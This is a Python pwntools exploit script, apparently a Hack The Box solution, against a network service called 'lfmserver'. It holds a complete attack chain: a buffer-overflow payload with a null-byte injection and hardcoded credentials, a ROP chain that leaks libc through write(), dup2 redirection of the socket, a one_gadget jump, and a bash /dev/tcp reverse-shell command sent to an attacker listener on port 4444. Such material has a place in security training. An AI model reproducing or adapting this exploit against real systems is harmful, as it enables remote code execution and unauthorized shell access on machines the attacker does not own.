#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn import *

if len(sys.argv) != 2:
    print 'Usage: python exploit.py [mode]\nmodes available - local/remote'
    sys.exit(1)
elif sys.argv[1] == 'local':
    p = remote('localhost', 8888)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    libc_one_gadget = 0xc84da
elif sys.argv[1] == 'remote':
    p = remote('10.10.10.173', 8888)
    libc = ELF('./libc.so.6', checksec=False)
    libc_one_gadget = 0x501e3
else:
    print 'Invalid mode'
    print 'modes available - local/remote'
    sys.exit(1)
def send_payload(rop):
    payload = 'CHECK /convert.php%00' + cyclic(148) + '{} LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n'.format(urlencode(rop))
    p.sendline(payload)

elf = ELF('./lfmserver', checksec=False)
plt_write = p64(elf.plt['write'])
got_socket = p64(elf.got['socket'])
plt_dup2 = p64(elf.plt['dup2'])
libc_socket = libc.symbols['socket']
pop_rdi = p64(0x405c4b)
pop_rsi_r15 = p64(0x405c49)

# leak libc everything
rop = pop_rdi + p64(0x6)
rop += pop_rsi_r15 + got_socket + p64(0x0)
rop += plt_write
send_payload(rop)
data = p.recvall()
socket = u64(data.split("\n")[1][:8].ljust(8, "\x00"))
log.success('leaked socket() : {}'.format(hex(socket)))
one_gadget = socket - (libc_socket - libc_one_gadget)
log.success('one gadget : {}'.format(hex(one_gadget)))

# duplicate file descriptor
rop =  pop_rdi + p64(0x6)
rop += pop_rsi_r15 + p64(0x0) + p64(0x0)
rop += plt_dup2
rop += pop_rdi + p64(0x6)
rop += pop_rsi_r15 + p64(0x1) + p64(0x0)
rop += plt_dup2
rop += pop_rdi + p64(0x6)
rop += pop_rsi_r15 + p64(0x2) + p64(0x0)
rop += plt_dup2

# shell
rop += p64(one_gadget)
if sys.argv[1] == 'local':
    p = remote('localhost', 8888)
    cmd = 'bash -c "bash -i>& /dev/tcp/localhost/4444 0>&1"'
elif sys.argv[1] == 'remote':
    p = remote('10.10.10.173', 8888)
    cmd = 'bash -c "bash -i>& /dev/tcp/10.10.14.152/4444 0>&1"'

send_payload(rop)
p.recv()
# for stable shell, set listener
p.sendline(cmd)
p.interactive()